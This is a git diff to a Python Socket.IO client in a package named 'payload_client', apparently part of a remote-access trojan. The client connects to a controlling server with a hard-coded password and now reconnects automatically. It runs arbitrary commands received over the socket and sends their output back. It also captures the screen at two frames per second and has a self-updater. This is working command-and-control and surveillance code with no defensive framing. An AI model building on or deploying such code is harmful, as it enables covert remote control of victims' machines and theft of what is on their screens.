@@ -1,4 +1,5 @@
 import socketio
+from flask_socketio import emit
 from socketio.exceptions import BadNamespaceError
 
 from payload_client import self_updater
@@ -13,8 +14,8 @@ class Server:
         self.screenshot_taker = ScreenCapture(self)
 
         self.URL = URL
-        self.sio = socketio.Client()
-        self.sio.connect(URL, auth={"password": "1234", "payload": True})
+        self.sio = socketio.Client(reconnection=True)
+        self.sio.connect(URL, auth={"password": "1234", "payload": True}, retry=True)
         print("CONNECTED?!")
         self.register_handlers()
         self._running = True
@@ -42,7 +43,8 @@ class Server:
         @self.sio.on('execute')
         def execute(command):
             #ToDo implement logic of formatting command as string
-            return self.code_executor.execute(command)
+            output = self.code_executor.execute(command)
+            self.sio.emit("output_of_command", output)
         @self.sio.on('start_screen_capture')
         def start_screen_capture():
             self.screenshot_taker.set_frames_per_second(2)  # Capture 2 frames per second
